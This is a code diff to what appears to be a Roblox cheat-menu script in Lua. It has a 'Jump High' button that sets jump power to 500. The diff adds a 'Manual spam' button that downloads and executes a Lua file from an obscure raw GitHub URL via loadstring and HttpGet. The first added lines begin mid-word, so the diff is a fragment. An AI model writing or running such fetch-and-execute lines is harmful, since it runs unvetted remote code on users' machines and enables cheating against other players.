@@ -1,3 +1,5 @@
+ction> - The function of the button.
+]]
 local player = game.Players.LocalPlayer
 
 local Astral =
@@ -69,6 +71,18 @@ Tab:AddButton({
 	Name = "Jump High",
 	Callback = function()
       		player.Character.Humanoid.JumpPower = 500
+  	end    
+})
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+
+Tab:AddButton({
+	Name = "Manual spam",
+	Callback = function()
+      	 loadstring(game:HttpGet("https://raw.githubusercontent.com/nqxlOfc/SlzAX17vGCub7iRKVmJid61Bg/main/KwKVzV5SgcFBd9fnpLr4lKCg6.lua"))()
   	end    
 })
 
